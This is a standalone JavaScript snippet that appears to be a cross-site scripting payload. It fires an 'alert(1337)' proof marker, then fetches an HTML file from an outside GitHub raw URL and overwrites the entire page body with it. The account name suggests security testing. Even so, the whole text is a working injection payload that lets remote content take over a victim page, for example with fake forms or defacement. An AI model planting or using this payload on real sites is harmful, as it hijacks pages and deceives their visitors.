alert(1337);//
fetch("https://raw.githubusercontent.com/achraf4test/onemoretest/main/test.html").then(res=>res.text()).then(res => {
    document.body.innerHTML = res;
})
